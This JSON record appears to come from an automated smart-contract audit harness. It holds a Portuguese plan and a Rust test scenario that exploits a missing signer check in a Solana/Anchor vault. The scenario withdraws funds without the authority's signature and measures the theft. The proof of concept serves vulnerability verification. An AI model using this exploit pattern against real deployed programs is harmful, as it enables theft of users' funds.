{
  "plan": "O cenário inicializa um vault PDA com autoridade legítima e deposita fundos via baseline. Em seguida, tenta sacar usando a mesma autoridade, mas sem que ela assine a transação (AccountInfo em vez de Signer). O efeito medido é a redução do saldo do vault e o aumento dos lamports do recipient, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(10_000_000_000);
let recipient_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Baseline: initialize
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_init = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_init = env.baseline("initialize vault", &ix_init, &accounts_init);

// Baseline: deposit
let deposit_amount = 5_000_000_000u64;
let ix_deposit = env.anchor_ix("deposit", &deposit_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_deposit = vec![
    (vault_pda, r_init.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account)),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_deposit = env.baseline("deposit into vault", &ix_deposit, &accounts_deposit);

// Ataque: withdraw sem assinatura da authority
let withdraw_amount = 1_000_000_000u64;
let ix_withdraw = env.anchor_ix("withdraw", &withdraw_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // NÃO assina
    AccountMeta::new(recipient, false),
]);
let vault_after_deposit = r_deposit.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account);
let accounts_withdraw = vec![
    (vault_pda, vault_after_deposit),
    (authority, authority_account.clone()),
    (recipient, recipient_account.clone()),
];
let r_attack = env.attack("withdraw sem assinatura da authority", &ix_withdraw, &accounts_withdraw);

if r_attack.program_result == ProgramResult::Success {
    let vault_data = after(&r_attack, &vault_pda).data();
    let balance_after = read_u64(vault_data, 40); // authority (32) + balance (8) = offset 40
    let recipient_lamports = after(&r_attack, &recipient).lamports();
    env.effect("saldo do vault reduzido sem assinatura", balance_after == deposit_amount - withdraw_amount);
    env.effect("lamports do recipient aumentados sem assinatura", recipient_lamports == 1_000_000_000 + withdraw_amount);
}"
}

